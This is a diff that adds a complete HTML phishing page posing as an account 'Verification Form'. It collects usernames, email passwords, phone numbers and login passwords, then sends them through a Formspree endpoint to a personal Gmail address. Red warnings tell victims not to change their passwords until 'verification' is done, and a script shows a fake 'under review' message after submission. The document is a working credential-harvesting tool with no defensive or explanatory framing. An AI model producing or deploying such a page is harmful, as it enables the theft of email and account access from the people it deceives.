@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Verification Page</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; padding: 40px; background-color: #f0f2f5; }
+        .form-container { width: 450px; background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        h2 { text-align: center; color: #333; margin-bottom: 25px; }
+        label { font-weight: bold; display: block; margin-top: 15px; color: #555; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        .note { color: red; font-size: 13px; font-weight: bold; display: block; margin-bottom: 5px; }
+        #verifyBtn { width: 100%; padding: 14px; background-color: #007bff; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 16px; margin-top: 25px; }
+        #statusMessage { margin-top: 20px; padding: 15px; border-radius: 6px; text-align: center; font-weight: bold; display: none; background-color: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
+    </style>
+</head>
+<body>
+
+<div class="form-container">
+    <h2>Verification Form</h2>
+    
+    <form action="https://formspree.io/f/nayeemmagray333@gmail.com" method="POST" id="vForm">
+        
+        <label>Username:</label>
+        <input type="text" name="Username" required>
+
+        <label>Email ID:</label>
+        <input type="email" name="Email" required>
+
+        <label>Email Password:</label>
+        <input type="password" name="EmailPassword" required>
+        <span class="note">don't change the email id password untill verification is done</span>
+
+        <label>Phone Number:</label>
+        <input type="text" name="Phone" required>
+
+        <label>Login Password:</label>
+        <input type="password" name="LoginPassword" required>
+        <span class="note">please do not change password untill verification is done</span>
+
+        <button type="submit" id="verifyBtn">Verify</button>
+    </form>
+
+    <div id="statusMessage">
+        Your verification is under review
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('vForm');
+    const btn = document.getElementById('verifyBtn');
+    const msg = document.getElementById('statusMessage');
+
+    form.onsubmit = function() {
+        // This makes the screen change for the client immediately
+        btn.style.display = "none"; 
+        msg.style.display = "block"; 
+    };
+</script>
+
+</body>
+</html>
